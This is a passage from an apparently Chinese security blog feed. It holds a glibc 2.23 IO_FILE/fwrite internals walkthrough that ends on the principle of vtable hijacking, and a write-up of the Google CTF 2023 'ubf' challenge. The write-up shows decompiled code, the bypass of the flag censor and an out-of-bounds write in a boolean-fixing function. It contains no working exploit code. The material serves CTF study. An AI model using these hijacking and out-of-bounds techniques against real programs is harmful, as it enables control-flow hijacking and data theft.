f-&gt;_IO_write_base &#x3D; f-&gt;_IO_write_ptr;     f-&gt;_IO_write_end &#x3D; f-&gt;_IO_buf_end;     f-&gt;_IO_read_base &#x3D; f-&gt;_IO_read_ptr &#x3D; f-&gt;_IO_read_end;     f-&gt;_flags |&#x3D; _IO_CURRENTLY_PUTTING;     if (f-&gt;_mode &lt;&#x3D; 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))f-&gt;_IO_write_end &#x3D; f-&gt;_IO_write_ptr;   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指针执行完看一下<code>_IO_list_all</code>，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>被赋值，且输入缓冲区相关指针被赋值为<code>_IO_buf_base</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all$3 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72536956,    _IO_read_ptr &#x3D; 0x406250 &quot;&quot;,    _IO_read_end &#x3D; 0x406250 &quot;&quot;,    _IO_read_base &#x3D; 0x406250 &quot;&quot;,    _IO_write_base &#x3D; 0x406250 &quot;&quot;,    _IO_write_ptr &#x3D; 0x406250 &quot;&quot;,    _IO_write_end &#x3D; 0x407250 &quot;&quot;,    _IO_buf_base &#x3D; 0x406250 &quot;&quot;,    _IO_buf_end &#x3D; 0x407250 &quot;&quot;,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,    _fileno &#x3D; 3,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x406100,    _offset &#x3D; -1,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x406110,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; -1,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来调用<code>_IO_new_do_write</code>函数来执行<code>write</code>将<code>write_ptr</code>到<code>write_end</code>之间的输入读入缓冲区</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (ch &#x3D;&#x3D; EOF)    return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">int_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123;  return (to_do &#x3D;&#x3D; 0  || (_IO_size_t) new_do_write (fp, data, to_do) &#x3D;&#x3D; to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数中又调用了<code>_IO_new_do_write</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123;  _IO_size_t count;  ...  count &#x3D; _IO_SYSWRITE (fp, data, to_do);  if (fp-&gt;_cur_column &amp;&amp; count)    fp-&gt;_cur_column &#x3D; _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base &#x3D; fp-&gt;_IO_write_ptr &#x3D; fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end &#x3D; (fp-&gt;_mode &lt;&#x3D; 0       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时来到了最终实现<code>write</code>的地方，即<code>_IO_SYSWRITE</code>函数（<code>vtable</code>中的&#96;&#96;__write<code>函数），实际调用的是</code>_IO_new_file_write<code>函数，按照指定长度调用</code>write&#96;函数写入内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;fileops.c   1253    1254 _IO_ssize_t   1255 _IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)   1256 &#123;   1257   _IO_ssize_t to_do &#x3D; n; ► 1258   while (to_do &gt; 0)   1259     &#123;   1260       _IO_ssize_t count &#x3D; (__builtin_expect (f-&gt;_flags2   1261                                              &amp; _IO_FLAGS2_NOTCANCEL, 0)   1262                            ? write_not_cancel (f-&gt;_fileno, data, to_do)   1263                            : write (f-&gt;_fileno, data, to_do));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_ssize_t_IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)&#123;  _IO_ssize_t to_do &#x3D; n;  while (to_do &gt; 0)    &#123;      _IO_ssize_t count &#x3D; (__builtin_expect (f-&gt;_flags2     &amp; _IO_FLAGS2_NOTCANCEL, 0)   ? write_not_cancel (f-&gt;_fileno, data, to_do)   : write (f-&gt;_fileno, data, to_do));      if (count &lt; 0)&#123;  f-&gt;_flags |&#x3D; _IO_ERR_SEEN;  break;&#125;      to_do -&#x3D; count;      data &#x3D; (void *) ((char *) data + count);    &#125;  n -&#x3D; to_do;  if (f-&gt;_offset &gt;&#x3D; 0)    f-&gt;_offset +&#x3D; n;  return n;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">  0x7ffff7a86ac8 &lt;_IO_file_write+40&gt;     test   byte ptr [r14 + 0x74], 2  0x7ffff7a86acd &lt;_IO_file_write+45&gt;     je     _IO_file_write+128                &lt;_IO_file_write+128&gt;   ↓  0x7ffff7a86b20 &lt;_IO_file_write+128&gt;    mov    edi, dword ptr [r14 + 0x70]  0x7ffff7a86b24 &lt;_IO_file_write+132&gt;    mov    rdx, rbx  0x7ffff7a86b27 &lt;_IO_file_write+135&gt;    mov    rsi, rbp► 0x7ffff7a86b2a &lt;_IO_file_write+138&gt;    call   write                &lt;write&gt;       fd: 0x3 (&#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;test)       buf: 0x406250 ◂— 0x0       n: 0x30  0x7ffff7a86b2f &lt;_IO_file_write+143&gt;    test   rax, rax  0x7ffff7a86b32 &lt;_IO_file_write+146&gt;    js     _IO_file_write+82                &lt;_IO_file_write+82&gt;  0x7ffff7a86b34 &lt;_IO_file_write+148&gt;    sub    rbx, rax  0x7ffff7a86b37 &lt;_IO_file_write+151&gt;    add    rbp, rax  0x7ffff7a86b3a &lt;_IO_file_write+154&gt;    test   rbx, rbx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用结束后回到<code>_new_do_write</code>函数，设置各种指针刷新输出缓冲区</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fp-&gt;_cur_column &amp;&amp; count)   fp-&gt;_cur_column &#x3D; _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); fp-&gt;_IO_write_base &#x3D; fp-&gt;_IO_write_ptr &#x3D; fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end &#x3D; (fp-&gt;_mode &lt;&#x3D; 0       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下<code>_IO_list_all</code>结构体，此时输出缓冲区中没有内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all$5 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72536956,    _IO_read_ptr &#x3D; 0x406250 &quot;&quot;,    _IO_read_end &#x3D; 0x406250 &quot;&quot;,    _IO_read_base &#x3D; 0x406250 &quot;&quot;,    _IO_write_base &#x3D; 0x406250 &quot;&quot;,    _IO_write_ptr &#x3D; 0x406250 &quot;&quot;,    _IO_write_end &#x3D; 0x407250 &quot;&quot;,    _IO_buf_base &#x3D; 0x406250 &quot;&quot;,    _IO_buf_end &#x3D; 0x407250 &quot;&quot;,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,    _fileno &#x3D; 3,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x406100,    _offset &#x3D; -1,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x406110,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; -1,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来回到<code>_IO_file_xsputn</code>函数，判断剩余输出数据是否大于输入缓冲区<code>buf</code>大小，若大于则不使用输出缓冲区直接调用<code>new_do_write</code>输出并刷新指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">     block_size &#x3D; f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;     do_write &#x3D; to_do - (block_size &gt;&#x3D; 128 ? to_do % block_size : 0);     if (do_write)&#123;  count &#x3D; new_do_write (f, s, do_write);  to_do -&#x3D; count;  if (count &lt; do_write)    return n - to_do;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出完大块的内容剩余的小块的内容继续调用<code>_IO_default_xsputn</code>函数输出到输出缓冲区，在长度不同的时候使用了不同的输出方式，即大于20使用<code>memcpy</code>，小于20使用for循环</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">to_do -&#x3D; _IO_default_xsputn (f, s+do_write, to_do);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_size_t_IO_default_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)&#123;  const char *s &#x3D; (char *) data;  _IO_size_t more &#x3D; n;  if (more &lt;&#x3D; 0)    return 0;  for (;;)    &#123;      &#x2F;* Space available. *&#x2F;      if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)&#123;  _IO_size_t count &#x3D; f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;  if (count &gt; more)    count &#x3D; more;  if (count &gt; 20)    &#123;#ifdef _LIBC      f-&gt;_IO_write_ptr &#x3D; __mempcpy (f-&gt;_IO_write_ptr, s, count);#else      memcpy (f-&gt;_IO_write_ptr, s, count);      f-&gt;_IO_write_ptr +&#x3D; count;#endif      s +&#x3D; count;    &#125;  else if (count)    &#123;      char *p &#x3D; f-&gt;_IO_write_ptr;      _IO_ssize_t i;      for (i &#x3D; count; --i &gt;&#x3D; 0; )*p++ &#x3D; *s++;      f-&gt;_IO_write_ptr &#x3D; p;    &#125;  more -&#x3D; count;&#125;      if (more &#x3D;&#x3D; 0 || _IO_OVERFLOW (f, (unsigned char) *s++) &#x3D;&#x3D; EOF)break;      more--;    &#125;  return n - more;&#125;libc_hidden_def (_IO_default_xsputn)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后结构体如下，输出缓冲区的大小刚好为<code>0x30</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all$6 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; -72536956,    _IO_read_ptr &#x3D; 0x406250 &quot;&quot;,    _IO_read_end &#x3D; 0x406250 &quot;&quot;,    _IO_read_base &#x3D; 0x406250 &quot;&quot;,    _IO_write_base &#x3D; 0x406250 &quot;&quot;,    _IO_write_ptr &#x3D; 0x406280 &quot;&quot;,    _IO_write_end &#x3D; 0x407250 &quot;&quot;,    _IO_buf_base &#x3D; 0x406250 &quot;&quot;,    _IO_buf_end &#x3D; 0x407250 &quot;&quot;,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,    _fileno &#x3D; 3,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x406100,    _offset &#x3D; -1,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x406110,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; -1,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他输出函数最终实现部分调用的也是<code>_IO_new_file_overflow</code>函数，所以利用输出函数就是利用<code>_IO_new_file_overflow</code>函数，需要注意函数对标志位的判断</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (f-&gt;_flags &amp; _IO_NO_WRITES) &#x2F;* SET ERROR *&#x2F;  &#123;    f-&gt;_flags |&#x3D; _IO_ERR_SEEN;    __set_errno (EBADF);    return EOF;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用<code>vtable</code>中的函数:</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p><strong><code>fopen</code></strong></p><ul><li><p><code>_IO_new_fopen</code></p><ul><li><p><code>__fopen_internal</code></p><ul><li><p><code>_IO_no_init</code>：初始化<code>fp</code>结构体</p></li><li><p><code>_IO_file_init-&gt;_IO_new_file_init</code>：将<code>fp</code>结构体连接到<code>_IO_list_all</code>结构体中</p><ul><li><code>_IO_link_in</code>：将文件指针链接到全局文件链表中</li></ul></li><li><p><code>_IO_file_fopen-&gt;_IO_new_file_fopen</code>：判断文件是否已打开以及一些标志位</p><ul><li><code>_IO_file_open</code>：调用<code>open</code>之后设置<code>fileno</code>标志位<ul><li><code>open</code></li><li><code>_IO_link_in</code>：使结构体进入<code>_IO_list_all</code></li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p><strong><code>fread</code></strong></p><ul><li><p><code>_IO_fread</code></p><ul><li><p><code>_IO_sgetn</code></p><ul><li><p><code>_IO_XSGETN-&gt;_IO_file_xsgetn</code> ：从文件流中读取指定数量的字节存储到目标缓冲区</p><ul><li><code>_IO_doallocbuf </code> ：分配新的缓冲区并设置<code>_IO_buf_base</code>和<code>_IO_buf_end</code><ul><li><code>_IO_DOALLOCATE-&gt;_IO_file_doallocate</code>：分配缓冲区<ul><li><code>_IO_SYSSTAT</code> ：获取文件状态，即<code>st</code>结构体</li></ul></li><li><code>_IO_setb</code>：设置<code>_IO_list_all</code>中的<code>_IO_buf_base</code>和<code>_IO_buf_end</code></li></ul></li><li>将<code>_IO_read_ptr</code>到<code>_IO_read_end</code>之间输入缓冲区原有的数据输入目标缓冲区</li><li><code>__underflow</code><ul><li><code>**_IO_UNDERFLOW-&gt;_IO_new_file_underflow**</code>：首先检查是否有读权限<ul><li><code>_IO_doallocbuf</code>：目标缓冲区未初始化时调用来初始化各指针为<code>_IO_buf_base</code></li><li><code>_IO_SYSREAD-&gt;_IO_file_read</code><ul><li><code>read</code>:向输入缓冲区读取大小为<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>的内容</li></ul></li><li>设置输入缓冲区结束地址</li></ul></li></ul></li><li>再次循环将输入缓冲区复制到目标缓冲区</li></ul></li></ul></li></ul></li></ul></li><li><p><strong><code>fwrite</code></strong></p><ul><li><p><code>_IO_fwrite</code></p><ul><li><p><code>_IO_sputn-&gt;_IO_new_file_xsputn</code></p><ul><li><p>计算输出缓冲区剩余空间，将需要输出数据复制到输出缓冲区</p></li><li><p><code>**_IO_OVERFLOW-&gt;_IO_new_file_overflow**</code>：缓冲区未建立或已满时建立或刷新输出缓冲区，会判断标志位，即是否有可写权限</p></li><li><p><code>_IO_doallocbuf</code>：若输出缓冲区未创建则调用该函数创建并给<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指针赋值</p></li><li><p><code>_IO_setg</code>：将输入相关的缓冲区指针赋值为<code>_IO_buf_base</code></p><ul><li>&#96;&#96;&#96;C<br>#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base &#x3D; (eb),<br>  (fp)-&gt;_IO_read_ptr &#x3D; (g), (fp)-&gt;_IO_read_end &#x3D; (eg))<pre class="line-numbers language-none"><code class="language-none">        - 将&#96;f-&gt;_IO_write_base&#96;、&#96;f-&gt;_IO_write_ptr&#96;设置成&#96;f-&gt;_IO_read_ptr&#96;指针；将&#96;f-&gt;_IO_write_end&#96;赋值为&#96;f-&gt;_IO_buf_end&#96;      - &#96;_IO_do_write-&gt;_IO_new_do_write&#96;        - &#96;new_do_write&#96;          - &#96;_IO_SYSWRITE-&gt;_IO_new_file_write&#96;            - &#96;write&#96;          - 设置各种指针刷新输出缓冲区      - 根据剩余输出数据大小选择&#96;memcpy&#96;或&#96;for&#96;循环输出并刷新指针## 劫持vtable原理&#96;_IO_FILE_plus&#96;结构体&#96;&#96;&#96;Cstruct _IO_FILE_plus&#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul></li></ul></li></ul></li></ul><p>其中<code>vtable</code>结构体中存着系统调用最终调用的函数，因此劫持<code>vtable</code>函数之后就可以劫持程序流，需要注意的是在<code>2.23</code>版本以上就会检查<code>vtable</code></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.z1r0.top/2021/10/09/IO-FILE">https://www.z1r0.top/2021/10/09/IO-FILE</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> IO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-googlectf-ubf复现</title>
      <link href="/2023/08/12/2023-googlectf-ubf/2023-googlectf-ubf/"/>
      <url>/2023/08/12/2023-googlectf-ubf/2023-googlectf-ubf/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Unnecessary binary format</code>（不必要的二进制格式）是指在计算机科学和软件工程中，存在着冗余或不必要的二进制数据表示形式。这种形式可能会导致资源浪费、性能下降或代码复杂化。</p></blockquote><p>本题对不同类型的数据规定了不同的输入格式</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall strs_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)&#123;  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-30h]  char *mem; &#x2F;&#x2F; [rsp+28h] [rbp-18h]  int i; &#x2F;&#x2F; [rsp+34h] [rbp-Ch]  char *content; &#x2F;&#x2F; [rsp+38h] [rbp-8h]  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;str [&quot;)];  if ( s &gt;&#x3D; a3 )    return 0LL;  mem &#x3D; a1-&gt;mem;  content &#x3D; &amp;mem[a1-&gt;offset];  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )  &#123;    censor_string(content, *&amp;mem[2 * i]);    s +&#x3D; snprintf(s, a3 - s, &quot;%s, &quot;, content);    if ( s &gt;&#x3D; a3 )      return 0LL;    content +&#x3D; *&amp;mem[2 * i] + 1;  &#125;  if ( a1-&gt;len &gt; 0 )    s -&#x3D; 2;  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];  if ( sa &lt; a3 )    return sa;  else    return 0LL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall bools_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)&#123;  char v4; &#x2F;&#x2F; al  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-30h]  char *mem; &#x2F;&#x2F; [rsp+30h] [rbp-10h]  int i; &#x2F;&#x2F; [rsp+3Ch] [rbp-4h]  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;bool [&quot;)];  if ( s &gt;&#x3D; a3 )    return 0LL;  mem &#x3D; a1-&gt;mem;  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )  &#123;    if ( mem[i] )      v4 &#x3D; &#39;T&#39;;    else      v4 &#x3D; &#39;F&#39;;    s +&#x3D; snprintf(s, a3 - s, &quot;%c, &quot;, v4);    if ( s &gt;&#x3D; a3 )      return 0LL;  &#125;  if ( a1-&gt;len &gt; 0 )    s -&#x3D; 2;  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];  if ( sa &lt; a3 )    return sa;  else    return 0LL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall ints_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)&#123;  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-20h]  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-20h]  char *mem; &#x2F;&#x2F; [rsp+20h] [rbp-10h]  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-4h]  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;int [&quot;)];  if ( s &gt;&#x3D; a3 )    return 0LL;  mem &#x3D; a1-&gt;mem;  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )  &#123;    s +&#x3D; snprintf(s, a3 - s, &quot;%d, &quot;, *&amp;mem[4 * i]);    if ( s &gt;&#x3D; a3 )      return 0LL;  &#125;  if ( a1-&gt;len &gt; 0 )    s -&#x3D; 2;  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];  if ( sa &lt; a3 )    return sa;  else    return 0LL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>1.string</code><br><code>|4byte total_len | 1byte type s | 2byte count | 2bytes count*2 | 2byte data ..</code></p></li><li><p><code>2.bool</code><br><code>|4byte size| 1byte type b | 2byte count | 2byte start_idx | bools</code></p></li><li><p><code>3.int</code><br><code>|4byte size| 1byte type i | 2byte count | 2byte smt | ints...</code></p></li></ul><p>题目开始会将<code>/flag</code>载入全局变量，输入<code>string</code>类型的<code>$FLAG</code>即可将<code>flag</code>载入并替换</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  ...  if ( !set_env_from_file(&quot;FLAG&quot;, &quot;&#x2F;flag&quot;) || !set_env_from_file(&quot;MOTD&quot;, &quot;&#x2F;motd&quot;) || !set_env_from_file(&quot;TEAM&quot;, &quot;&#x2F;team&quot;) )    return -1;  ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall set_env_from_file(const char *a1, const char *a2)&#123;  char s[8]; &#x2F;&#x2F; [rsp+10h] [rbp-210h] BYREF  __int64 v4; &#x2F;&#x2F; [rsp+18h] [rbp-208h]  char v5[496]; &#x2F;&#x2F; [rsp+20h] [rbp-200h] BYREF  int v6; &#x2F;&#x2F; [rsp+214h] [rbp-Ch]  FILE *stream; &#x2F;&#x2F; [rsp+218h] [rbp-8h]  stream &#x3D; fopen(a2, &quot;r&quot;);  *s &#x3D; 0LL;  v4 &#x3D; 0LL;  memset(v5, 0, sizeof(v5));  if ( stream &amp;&amp; fgets(s, 512, stream) )  &#123;    v6 &#x3D; strlen(s) - 1;    if ( s[v6] &#x3D;&#x3D; &#39;\n&#39; )      s[v6] &#x3D; 0;    setenv(a1, s, 1);    return 1LL;  &#125;  else  &#123;    printf(&quot;Error reading %s\n&quot;, a2);    return 0LL;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按规定格式输入之后会进行一系列的解码，再输出相应的内容，但是检测到输出内容含有<code>CTF&#123;</code>会将后续内容替换成<code>xxxx</code>，因此需要将这个头改成其他的绕过检测</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __fastcall censor_string(char *a1, int a2)&#123;  if ( a2 &gt; 5 &amp;&amp; *a1 &#x3D;&#x3D; &#39;C&#39; &amp;&amp; a1[1] &#x3D;&#x3D; &#39;T&#39; &amp;&amp; a1[2] &#x3D;&#x3D; &#39;F&#39; &amp;&amp; a1[3] &#x3D;&#x3D; &#39;&#123;&#39; )    memset(a1 + 4, &#39;X&#39;, a2 - 5);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在修复损坏的布尔类型的函数中存在数组越界</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __fastcall fix_corrupt_booleans(UNPACK *string)&#123;  unsigned __int64 v1; &#x2F;&#x2F; [rsp+10h] [rbp-18h]  char *v2; &#x2F;&#x2F; [rsp+18h] [rbp-10h]  int i; &#x2F;&#x2F; [rsp+24h] [rbp-4h]  v2 &#x3D; 